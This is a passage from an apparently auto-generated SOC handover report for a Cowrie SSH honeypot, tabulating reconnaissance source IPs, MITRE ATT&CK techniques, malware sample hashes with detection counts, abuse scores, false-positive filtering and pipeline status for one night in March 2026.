| `2026-03-29 05:01:41` | `cowrie.command.input` |
| `2026-03-29 05:01:41` | `cowrie.log.closed` |
| `2026-03-29 05:01:42` | `cowrie.session.params` |
| `2026-03-29 05:01:42` | `cowrie.command.input` |
| `2026-03-29 05:01:42` | `cowrie.log.closed` |
| `2026-03-29 05:01:42` | `cowrie.session.params` |
| `2026-03-29 05:01:42` | `cowrie.command.input` |
| `2026-03-29 05:01:42` | `cowrie.log.closed` |
| `2026-03-29 05:01:43` | `cowrie.session.params` |
| `2026-03-29 05:01:43` | `cowrie.command.input` |
| `2026-03-29 05:01:43` | `cowrie.log.closed` |
| `2026-03-29 05:01:43` | `cowrie.session.params` |
| `2026-03-29 05:01:43` | `cowrie.command.input` |
| `2026-03-29 05:01:43` | `cowrie.log.closed` |
| `2026-03-29 05:01:44` | `cowrie.session.params` |
| `2026-03-29 05:01:44` | `cowrie.command.input` |
| `2026-03-29 05:01:44` | `cowrie.log.closed` |
| `2026-03-29 05:01:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.115[.]54` to AbuseIPDB if not already reported
- [ ] Block `14.103.115[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.123.43[.]71` | **11** | 2026-03-29 03:18 | 2026-03-29 03:21 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `3.130.168[.]2` | **5** | 2026-03-29 04:13 | 2026-03-29 04:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.27.197[.]142` | **4** | 2026-03-29 04:50 | 2026-03-29 04:52 | 3m | 0 | `T1592` | 🟢 LOW |
| `112.162.155[.]242` | **2** | 2026-03-29 05:18 | 2026-03-29 05:18 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `115.151.72[.]122` | **2** | 2026-03-29 04:28 | 2026-03-29 04:30 | 4m | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]54` | **2** | 2026-03-29 05:01 | 2026-03-29 05:03 | 4m | 0 | `T1592` | 🟢 LOW |
| `20.118.241[.]250` | **2** | 2026-03-29 03:40 | 2026-03-29 03:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.121.46[.]26` | **2** | 2026-03-29 02:25 | 2026-03-29 02:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.194[.]2` | **2** | 2026-03-29 02:59 | 2026-03-29 02:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.55[.]67` | 1 | 2026-03-29 02:53 | 2026-03-29 02:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.13.4[.]128` | 1 | 2026-03-29 03:08 | 2026-03-29 03:08 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.201.104[.]216` | 1 | 2026-03-29 03:51 | 2026-03-29 03:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `101.53.158[.]202` | 1 | 2026-03-29 04:57 | 2026-03-29 04:57 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.160.130[.]8` | 1 | 2026-03-29 04:26 | 2026-03-29 04:26 | 13s | 0 | `T1592` | 🟢 LOW |
| `103.219.154[.]156` | 1 | 2026-03-29 02:16 | 2026-03-29 02:16 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.48.161[.]42` | 1 | 2026-03-29 02:12 | 2026-03-29 02:12 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.23[.]240` | 1 | 2026-03-29 05:08 | 2026-03-29 05:08 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.102.61[.]21` | 1 | 2026-03-29 04:52 | 2026-03-29 04:52 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.197.113[.]76` | 1 | 2026-03-29 04:33 | 2026-03-29 04:33 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.27.129[.]78` | 1 | 2026-03-29 04:04 | 2026-03-29 04:04 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.193.36[.]205` | 1 | 2026-03-29 04:28 | 2026-03-29 04:28 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.6.55[.]57` | 1 | 2026-03-29 05:37 | 2026-03-29 05:37 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.198.138[.]185` | 1 | 2026-03-29 03:45 | 2026-03-29 03:45 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.28.109[.]188` | 1 | 2026-03-29 04:06 | 2026-03-29 04:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.159.71[.]249` | 1 | 2026-03-29 03:55 | 2026-03-29 03:55 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `123.129.245[.]249` | 1 | 2026-03-29 04:14 | 2026-03-29 04:14 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `124.239.169[.]52` | 1 | 2026-03-29 05:28 | 2026-03-29 05:28 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.138.115[.]99` | 1 | 2026-03-29 02:58 | 2026-03-29 02:58 | 30s | 0 | `T1592` | 🟢 LOW |
| `132.248.44[.]87` | 1 | 2026-03-29 05:33 | 2026-03-29 05:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.135.75[.]56` | 1 | 2026-03-29 02:53 | 2026-03-29 02:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `155.212.17[.]174` | 1 | 2026-03-29 05:18 | 2026-03-29 05:18 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `171.105.76[.]100` | 1 | 2026-03-29 02:53 | 2026-03-29 02:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.30.212[.]99` | 1 | 2026-03-29 02:30 | 2026-03-29 02:30 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.150.97[.]200` | 1 | 2026-03-29 04:59 | 2026-03-29 04:59 | 13s | 0 | `T1592` | 🟢 LOW |
| `178.178.194[.]137` | 1 | 2026-03-29 03:33 | 2026-03-29 03:33 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.232.215[.]211` | 1 | 2026-03-29 03:10 | 2026-03-29 03:10 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.60.165[.]5` | 1 | 2026-03-29 02:47 | 2026-03-29 02:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.147[.]227` | 1 | 2026-03-29 02:56 | 2026-03-29 02:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.53[.]200` | 1 | 2026-03-29 02:14 | 2026-03-29 02:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `192.228.199[.]225` | 1 | 2026-03-29 03:35 | 2026-03-29 03:35 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.155.225[.]93` | 1 | 2026-03-29 02:30 | 2026-03-29 02:30 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.55.100[.]104` | 1 | 2026-03-29 02:34 | 2026-03-29 02:34 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `201.93.162[.]76` | 1 | 2026-03-29 05:04 | 2026-03-29 05:04 | 15s | 0 | `T1592` | 🟢 LOW |
| `203.129.225[.]4` | 1 | 2026-03-29 02:36 | 2026-03-29 02:36 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.253.10[.]61` | 1 | 2026-03-29 04:48 | 2026-03-29 04:48 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.237.71[.]112` | 1 | 2026-03-29 03:29 | 2026-03-29 03:30 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.246.43[.]172` | 1 | 2026-03-29 05:12 | 2026-03-29 05:12 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.78.85[.]92` | 1 | 2026-03-29 03:26 | 2026-03-29 03:26 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `221.162.9[.]13` | 1 | 2026-03-29 02:49 | 2026-03-29 02:49 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.123.111[.]118` | 1 | 2026-03-29 04:34 | 2026-03-29 04:34 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.186.33[.]225` | 1 | 2026-03-29 04:35 | 2026-03-29 04:35 | 31s | 0 | `T1592` | 🟢 LOW |
| `47.24.76[.]39` | 1 | 2026-03-29 04:59 | 2026-03-29 05:00 | 30s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]37` | 1 | 2026-03-29 03:08 | 2026-03-29 03:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `82.196.106[.]164` | 1 | 2026-03-29 04:29 | 2026-03-29 04:29 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `90.173.78[.]90` | 1 | 2026-03-29 04:22 | 2026-03-29 04:22 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `91.196.152[.]182` | 1 | 2026-03-29 04:01 | 2026-03-29 04:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]183` | 1 | 2026-03-29 04:01 | 2026-03-29 04:01 | 10s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]208` | 1 | 2026-03-29 04:01 | 2026-03-29 04:01 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]210` | 1 | 2026-03-29 04:01 | 2026-03-29 04:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]222` | 1 | 2026-03-29 03:29 | 2026-03-29 03:29 | 0s | 3 | `T1110.001` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `49.124.153[.]37` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 20 |
| `2.55.100[.]104` | IL | Partner Communications Ltd. | **100** ⚠️ | 50 |
| `182.225.134[.]13` | KR | LG POWERCOMM | **100** ⚠️ | 50 |
| `171.105.76[.]100` | CN | CHINANET GUANGXI PROVINCE NETWORK | **100** ⚠️ | 13 |
| `20.118.241[.]250` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `101.126.55[.]67` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `197.155.225[.]93` | ZW | LIQUID Zimbabwe MPLS Core | **100** ⚠️ | 32 |
| `178.150.97[.]200` | UA | CONTENT DELIVERY NETWORK LTD | **100** ⚠️ | 16 |
| `183.171.53[.]200` | MY | Celcom Axiata Berhad | **100** ⚠️ | 15 |
| `90.173.78[.]90` | ES | Orange Espagne SA | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 61 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 36 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |

---

## 🔕 False Positive Summary (13 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 7 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 106 cases |
| Tool 34  | Credential Extractor        | ✅ 48 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 73 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 13 filtered (12.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 52 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 10 priority case(s) shown individually · 60 recon entry/entries in table (9 group(s) consolidating 32 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-29T05:43:18Z_
